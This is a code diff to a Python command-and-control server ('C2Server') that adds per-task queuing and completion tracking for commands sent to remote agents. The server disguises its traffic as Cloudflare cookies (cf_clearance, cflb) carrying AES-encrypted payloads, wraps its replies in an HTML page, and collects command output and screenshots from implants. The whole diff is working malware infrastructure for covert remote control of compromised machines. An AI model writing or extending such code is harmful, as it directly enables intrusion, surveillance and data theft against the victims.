@@ -366,18 +366,23 @@ class C2Server:
     def _process_command_output(self, cf_clearance_cookie, cflb_cookie):
         try:
             decrypted_clearance = aes_encrypt_decrypt(cf_clearance_cookie, "decrypt")
-            uuid = json.loads(decrypted_clearance)['uuid']
+            clearance_data = json.loads(decrypted_clearance)
+            uuid = clearance_data['uuid']
+            tid = clearance_data.get('tid')
             decrypted_output = aes_encrypt_decrypt(cflb_cookie, "decrypt")
-            
+
             if "[SCREENSHOT]" in decrypted_output:
                 self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
-                updated_output = decrypted_output.replace("[SCREENSHOT]", "")
-                self.db.set_command_output(uuid, updated_output)
-                self.db.update_command_history_output(uuid, updated_output)
+                decrypted_output = decrypted_output.replace("[SCREENSHOT]", "")
             else:
-                self.db.set_command_output(uuid, decrypted_output)
-                self.db.update_command_history_output(uuid, decrypted_output)
                 self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via cookie")
+
+            self.db.set_command_output(uuid, decrypted_output)
+
+            if tid:
+                self.db.complete_task(tid, decrypted_output)
+            else:
+                self.db.complete_task_by_uuid(uuid, decrypted_output)
         except Exception as e:
             self.logger.log_event(f"Error saving output from cookie: {e}")
     
@@ -385,42 +390,46 @@ class C2Server:
         try:
             if not request.data:
                 return self._generate_upload_error_response("No command output data received")
-                
+
             encrypted_data = request.data.decode('utf-8')
             decrypted_data = aes_encrypt_decrypt(encrypted_data, "decrypt")
             output_data = json.loads(decrypted_data)
-            
+
             if output_data.get('type') != 'command_output':
                 return self._generate_upload_error_response("Invalid data type")
-                
+
             uuid = output_data.get('uuid')
             command_output = output_data.get('data')
-            
+            tid = output_data.get('tid')
+
             if not uuid or not command_output:
                 return self._generate_upload_error_response("Missing required fields")
-                
+
             if "[SCREENSHOT]" in command_output:
                 self.logger.log_event(f"SCREENSHOT - Received from {uuid[:8]}")
-                updated_output = command_output.replace("[SCREENSHOT]", "")
-                self.db.set_command_output(uuid, updated_output)
-                self.db.update_command_history_output(uuid, updated_output)
+                command_output = command_output.replace("[SCREENSHOT]", "")
             else:
-                self.db.set_command_output(uuid, command_output)
-                self.db.update_command_history_output(uuid, command_output)
                 self.logger.log_event(f"OUTPUT - Received from {uuid[:8]} via POST")
-                
+
+            self.db.set_command_output(uuid, command_output)
+
+            if tid:
+                self.db.complete_task(tid, command_output)
+            else:
+                self.db.complete_task_by_uuid(uuid, command_output)
+
             response_data = {
                 "status": "success",
                 "message": "Command output received successfully"
             }
             json_str = json.dumps(response_data)
             encrypted_response = self._encrypt_json_response(json_str)
-            
+
             html_response = self.html_template.replace("{base64_data}", encrypted_response)
-            
+
             response = self.app.response_class(html_response, status=200, mimetype='text/html')
             return self._apply_agent_headers(response)
-            
+
         except Exception as e:
             self.logger.log_event(f"Error processing command output via POST: {e}")
             return self._generate_upload_error_response(f"Error processing command output: {str(e)}")
@@ -430,25 +439,32 @@ class C2Server:
             if 'cf_clearance' in cookies:
                 decrypted_clearance = aes_encrypt_decrypt(cookies['cf_clearance'], "decrypt")
                 uuid = json.loads(decrypted_clearance)['uuid']
-                command = self.db.get_command(uuid)
-                response_data = {
-                    "uuid": uuid,
-                    "cmd": command if command else ""
-                }
+
+                task = self.db.get_next_task(uuid)
+                if task:
+                    self.db.dispatch_task(task['id'])
+                    response_data = {
+                        "uuid": uuid,
+                        "cmd": task['command'],
+                        "tid": task['id']
+                    }
+                else:
+                    response_data = {"uuid": uuid, "cmd": "", "tid": 0}
+
                 json_str = json.dumps(response_data)
                 encrypted_response = self._encrypt_json_response(json_str)
-                
+
                 html_response = self.html_template.replace("{base64_data}", encrypted_response)
-                
+
                 response = self.app.response_class(html_response, status=200, mimetype='text/html')
                 return self._apply_agent_headers(response)
         except Exception as e:
             self.logger.log_event(f"Error generating JSON response: {e}")
-            
-        empty_response = self._encrypt_json_response('{"uuid":"","cmd":""}')
-        
+
+        empty_response = self._encrypt_json_response('{"uuid":"","cmd":"","tid":0}')
+
         html_response = self.html_template.replace("{base64_data}", empty_response)
-        
+
         response = self.app.response_class(html_response, status=200, mimetype='text/html')
         return self._apply_agent_headers(response)
     
